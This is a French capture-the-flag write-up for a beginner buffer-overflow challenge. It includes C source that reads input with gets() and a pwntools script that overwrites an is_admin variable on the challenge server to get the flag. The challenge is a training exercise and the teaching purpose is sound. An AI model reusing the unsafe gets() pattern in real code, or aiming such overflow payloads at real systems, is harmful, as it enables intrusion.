---
title: "PwnMe Junior 2025 - Overflowme"
date: 2024-04-14
tags: ["pwn", "buffer-overflow", "exploitation"]
categories: ["pwn"]
ctfs: ["pwnme-junior"]
---

# Write-up: Overflowme - PwnMe Junior 2025

## Description

Overflowme est un challenge de type "buffer overflow" classique, parfait pour s'initier aux techniques d'exploitation basiques.

## Analyse du binaire

Le programme est un binaire ELF 64 bits qui demande un nom d'utilisateur, puis vérifie si l'utilisateur est "admin". Si ce n'est pas le cas, il affiche un message d'erreur.

Voici un extrait du code source :

```c
#include <stdio.h>
#include <string.h>

int main() {
    char username[32];
    int is_admin = 0;
    
    printf("Username: ");
    gets(username);  // Vulnérabilité: utilisation de gets()
    
    if (is_admin) {
        printf("Welcome, admin! Here's your flag: PwnMe{buffer_0verflow_1s_e4sy}\n");
    } else {
        printf("Hello, %s! You are not admin.\n", username);
    }
    
    return 0;
}
```

## Vulnérabilité

La vulnérabilité se situe dans l'utilisation de la fonction `gets()`, qui lit l'entrée utilisateur sans vérifier la taille du buffer. Cela permet d'écrire au-delà des 32 caractères alloués à `username` et donc de modifier la valeur de `is_admin`.

## Exploitation

Pour exploiter cette vulnérabilité, il suffit d'envoyer 32 caractères pour remplir le buffer `username`, puis 4 ou 8 octets supplémentaires (selon l'architecture) pour écraser la valeur de `is_admin` avec une valeur non nulle.

```python
from pwn import *

# Connexion au serveur
conn = remote('challenge.pwnme.fr', 1337)

# Construction du payload: 32 'A' pour remplir le buffer + "\x01\x00\x00\x00" pour écraser is_admin
payload = b"A" * 32 + p32(1)

# Envoi du payload
conn.sendlineafter(b"Username: ", payload)

# Réception et affichage du flag
print(conn.recvall().decode())
```

## Flag

En exécutant l'exploit, nous obtenons le flag : `PwnMe{buffer_0verflow_1s_e4sy}` 